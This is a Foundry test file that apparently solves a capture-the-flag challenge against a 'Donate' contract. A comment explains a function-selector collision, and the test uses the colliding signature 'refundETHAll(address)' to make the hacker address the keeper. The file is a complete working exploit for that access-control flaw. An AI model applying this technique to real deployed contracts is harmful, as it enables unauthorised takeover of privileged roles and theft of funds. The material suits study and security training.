// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/donate.sol";

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
    }

    function testhack() public {
        vm.startPrank(hacker);
        // Hack Time
        // since we can put arbitrary function, and the function hash checked for the whole hash instead of the first 4 bytes.
        // we can find other function that return the same selector (first 4 bytes)
        // in this case, after checking in here : https://www.4byte.directory/signatures/?bytes4_signature=0x09779838
        // we got "refundETHAll(address)"
        donate.secretFunction("refundETHAll(address)");
        assertEq(donate.keeper(), hacker, "should become keeper");
    }
}
